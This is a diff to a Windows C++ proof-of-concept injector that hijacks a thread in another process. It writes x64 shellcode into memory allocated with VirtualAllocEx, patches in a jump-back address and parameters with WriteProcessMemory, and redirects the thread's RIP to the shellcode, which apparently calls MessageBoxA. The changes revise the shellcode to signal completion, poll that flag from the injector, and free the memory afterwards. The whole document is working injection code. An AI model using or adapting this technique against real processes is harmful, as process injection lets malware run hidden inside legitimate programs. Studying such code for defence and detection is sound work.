@@ -15,11 +15,10 @@ HANDLE g_hProcess = NULL;
 
 #ifdef _WIN64
 static const BYTE ShellcodeBytes[] =
-"\x48\x83\xEC\x08\xC7\x04\x24\xCC\xCC\xCC\xCC\xC7\x44\x24\x04\xCC\xCC\xCC\xCC"
-"\x9C\x50\x51\x52\x53\x55\x56\x57\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41"
-"\x55\x41\x56\x41\x57\x48\xB8\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\x48\x33\xC9\x48"
-"\x8D\x50\x08\x4C\x8D\x40\x1C\xFF\x10\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x41\x5B"
-"\x41\x5A\x41\x59\x41\x58\x5F\x5E\x5D\x5B\x5A\x59\x58\x9D\xC3";
+"\x48\x83\xEC\x08\xC7\x04\x24\xCC\xCC\xCC\xCC\xC7\x44\x24\x04\xCC\xCC\xCC\xCC\x9C\x50\x51\x52\x53\x55\x56\x57\x41\x50\x41\x51\x41\x52"
+"\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x48\xB8\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\x48\x83\xEC\x08\x48\x89\x04\x24\x48\x33\xC9\x48\x8D"
+"\x50\x08\x4C\x8D\x40\x1C\x4D\x33\xC9\x41\x51\xFF\x10\x41\x59\x48\x8B\x04\x24\x48\xC7\x00\x00\x00\x00\x00\x48\x83\xC4\x08\x41\x5F\x41"
+"\x5E\x41\x5D\x41\x5C\x41\x5B\x41\x5A\x41\x59\x41\x58\x5F\x5E\x5D\x5B\x5A\x59\x58\x9D\xC3";
 #endif
 
 using fMessageBoxA = int(WINAPI*)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
@@ -76,18 +75,16 @@ void HijackThread(DWORD Pid, UINT_PTR ShellcodeAddress, UINT_PTR ShellcodeParams
 	
 	if (GetThreadContext(hThread, &ThreadContext))
 	{
-		SIZE_T NumberOfBytesWritten = 0;
-
 		UINT_PTR JmpBackAddr = ThreadContext.Rip;
 
 		DWORD LoJmpBk = LODWORD(JmpBackAddr);
 		DWORD HiJmpBk = HIDWORD(JmpBackAddr);
 
-		WriteProcessMemory(g_hProcess, (LPVOID)(ShellcodeAddress + 7), &LoJmpBk, sizeof(DWORD), &NumberOfBytesWritten);
-		WriteProcessMemory(g_hProcess, (LPVOID)(ShellcodeAddress + 15), &HiJmpBk, sizeof(DWORD), &NumberOfBytesWritten);
+		WriteProcessMemory(g_hProcess, (LPVOID)(ShellcodeAddress + 7), &LoJmpBk, sizeof(DWORD), NULL);
+		WriteProcessMemory(g_hProcess, (LPVOID)(ShellcodeAddress + 15), &HiJmpBk, sizeof(DWORD), NULL);
 
 		DWORD64 Buffer64 = ShellcodeParams;
-		WriteProcessMemory(g_hProcess, (LPVOID)(ShellcodeAddress + 45), &Buffer64, sizeof(DWORD64), &NumberOfBytesWritten);
+		WriteProcessMemory(g_hProcess, (LPVOID)(ShellcodeAddress + 45), &Buffer64, sizeof(DWORD64), NULL);
 
 #ifdef _WIN64
 		ThreadContext.Rip = (DWORD64)ShellcodeAddress;
@@ -108,7 +105,9 @@ void HijackThread(DWORD Pid, UINT_PTR ShellcodeAddress, UINT_PTR ShellcodeParams
 		return;
 	}
 
-	WaitForSingleObject(hThread, INFINITE);
+	UINT_PTR ThreadFinish = 0;
+	while (ReadProcessMemory(g_hProcess, (LPVOID)(ShellcodeParams), &ThreadFinish, sizeof(UINT_PTR), NULL), ThreadFinish)
+		;
 
 	CloseHandle(hThread);
 }
@@ -147,7 +146,7 @@ int main(int argc, char* argv[])
 		printf("[!] VirtualAllocEx failed. Err code: 0x%X\n", GetLastError());
 		return 0;
 	}
-	printf("[*] %i bytes of memory allocated inside target process.\n", sizeof(ShellcodeBytes) + sizeof(SC_PARAM));
+	printf("[*] %i bytes of memory allocated inside target process [%p].\n", sizeof(ShellcodeBytes) + sizeof(SC_PARAM), ShellcodeMemory);
 
 	do
 	{
@@ -205,12 +204,12 @@ int main(int argc, char* argv[])
 	} while (FALSE);
 
 	// Freeing the entire allocated Shellcode memory.
-	//if (!VirtualFreeEx(g_hProcess, ShellcodeMemory, 0, MEM_RELEASE))
-	//{
-	//	printf("[!] VirtualFreeEx failed. Err code: 0x%X\n", GetLastError());
-	//	return 0;
-	//}
-	//printf("[*] Allocated memory released.\n");
+	if (!VirtualFreeEx(g_hProcess, ShellcodeMemory, 0, MEM_RELEASE))
+	{
+		printf("[!] VirtualFreeEx failed. Err code: 0x%X\n", GetLastError());
+		return 0;
+	}
+	printf("[*] Allocated memory released.\n");
 
 	CloseHandle(g_hProcess);
 	printf("[*] Process handle released.\n");
